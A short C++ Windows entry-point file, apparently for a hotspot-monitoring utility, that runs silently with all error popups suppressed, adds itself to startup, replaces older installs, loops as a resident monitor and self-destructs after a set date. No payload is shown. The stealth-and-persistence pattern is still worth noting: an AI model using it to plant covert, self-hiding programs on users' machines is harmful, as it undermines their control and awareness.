#include "config.h"
#include "logger.h"
#include "migrate.h"
#include "monitor.h"
#include "selfdestruct.h"
#include "silent.h"
#include "startup.h"

#include <windows.h>

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // 最优先：进入完全静默模式，任何错误都不允许弹窗
    EnterSilentMode();

    WriteLog(L"=== Program Start ===");

    // 超过自毁日期：不开热点，直接自毁
    if (IsPastDestructDate()) {
        SelfDestruct();
        WriteLog(L"=== Program End (self-destructed) ===");
        return 0;
    }

    // 单实例运行，避免重复监控
    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Local\\" APP_NAME L"SingleInstance");
    if (hMutex && GetLastError() == ERROR_ALREADY_EXISTS) {
        WriteLog(L"Another instance is already running, exiting");
        CloseHandle(hMutex);
        return 0;
    }

    // 清除旧版本安装（必须先于 AddToStartup，从注册表读取旧路径）
    ReplaceOldInstallation();

    // 注册开机启动项（覆盖为自身路径）
    AddToStartup();

    // 进入常驻监控循环（仅在自毁时返回）
    RunMonitorLoop();

    if (hMutex) CloseHandle(hMutex);
    WriteLog(L"=== Program End ===");
    return 0;
}
